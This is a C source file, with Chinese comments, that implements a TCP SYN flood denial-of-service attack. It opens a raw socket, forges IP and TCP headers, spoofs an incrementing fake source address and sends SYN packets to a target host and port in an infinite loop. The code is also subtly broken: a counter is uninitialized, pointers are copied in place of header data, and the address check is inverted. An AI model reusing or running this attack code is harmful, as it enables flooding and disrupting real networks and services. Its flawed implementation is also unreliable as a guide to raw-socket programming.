#include"synconn.h"
static inline long myrandom(int begin,int end)
{
   // int gap = end - begin + 1;
    int ret = 0;
    srand((unsigned)time(NULL));
    ret = rand() % end + begin;
    return ret;
}
int startsynattack(const char * __ipaddr ,int __port)
{
        int FakeIpNet;
        int FakeIpHost;
        struct sockaddr_in addr;
        int sockfd;
        struct hostent *host;
        int on = 1;
        int ret;
        bzero(&addr,sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(__port);
        FakeIpNet = inet_addr(FAKE_IP);
        FakeIpHost = ntohl(FakeIpNet);
    if((ret = inet_aton(__ipaddr,&addr.sin_addr)) != 0)
    {
       if(( host = gethostbyname(__ipaddr)) == NULL){
           return 2001;
       }
       else{
           memcpy((char *)&addr.sin_addr,(host->h_addr_list)[0],host->h_length);
       }
       sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
       if(sockfd < 0){
           return errno;
       }
       setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
       setuid(getpid());
       sendsynfunc(FakeIpHost,sockfd,&addr);
   }
       return 0;
}
static ushort chksum(ushort *data,ushort length)
{
    int nleft = length;
    int sum = 0;
    ushort *word = data;
    ushort ret = 0;
    while(nleft > 1)
    {
        sum += *word++;
        nleft -= 2;
    }
    if(nleft == 1)
    {
        *(uchar *)(&ret) = *(uchar *)word;
        sum += ret;
    }
    sum = (sum >> 16)+(sum & 0xffff);
    sum += (sum >> 16);
    ret = ~sum;
    return (ret);
}
void sendsynfunc(int FakeIpHost,int sockfd,struct sockaddr_in *addr)
{
    int SendSEQ;
    int count;
    char buf[40];
    char sendBuf[100];
    struct ip *ip;
    struct tcphdr *tcp;
    struct prehdr
    {
        struct sockaddr_in sourceaddr;//source address
        struct sockaddr_in destaddr;//dst daaress
        uchar zero;
        uchar protocol;
        ushort length;
    }prehdr;
   int len = sizeof(struct ip)+sizeof(struct tcphdr);
   bzero(buf,sizeof(buf));
   bzero(sendBuf,sizeof(sendBuf));
   ip = (struct ip *)sendBuf;//指向发送缓冲区的头部
   ip->ip_v = 4;
   ip->ip_hl = 5;
   ip->ip_tos = 0;
   ip->ip_len = htons(len);
   ip->ip_id = 0;
   ip->ip_off = 0;//由内核填写
   ip->ip_ttl = myrandom(128,255);
   ip->ip_p = IPPROTO_TCP;
   ip->ip_sum = 0;
   ip->ip_dst = addr->sin_addr;//目的地址，即攻击目标
   printf("ipheader fill finished\n");
   tcp=(struct tcphdr*)(sendBuf+sizeof(struct ip));//获取指向TCP头部的指针
   tcp->seq = htonl((ulong)myrandom(0,65535));
   tcp->dest = addr->sin_port;//目的端口
   tcp->ack_seq = htons(myrandom(0,65535));
   tcp->syn = 1;
   tcp->urg = 1;
   tcp->window = htons(myrandom(0,65535));
   tcp->check = 0;//校验和
   tcp->urg_ptr = htons(myrandom(0,65535));
   //循环发送
   while(1)
   {
       if(SendSEQ++ == 65535){
            SendSEQ = 1;
       }
       ip->ip_src.s_addr = htonl(FakeIpHost+SendSEQ);
       ip->ip_sum = 0;
       tcp->seq = htonl(0x12345678+SendSEQ);
       tcp->check = 0;
       printf("source addr is :%s\n",inet_ntoa(ip->ip_src));
       printf("dest addr is :%s\n",inet_ntoa(addr->sin_addr));
       printf("\n============================\n");
       prehdr.sourceaddr.sin_addr = ip->ip_src;
       prehdr.destaddr.sin_addr = addr->sin_addr;
       prehdr.zero = 0;
       prehdr.protocol = 4;
       prehdr.length = sizeof(struct tcphdr);
       memcpy(buf,&prehdr,sizeof( prehdr));
       memcpy(buf+sizeof( prehdr),&tcp,sizeof(struct tcphdr));
       tcp->check = chksum((u_short *)&buf,12+sizeof(struct tcphdr));
       memcpy(sendBuf,&ip,sizeof(ip));
       memcpy(sendBuf+sizeof(ip),&tcp,sizeof(tcp));
       sendto(sockfd,sendBuf,len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));
   }
}
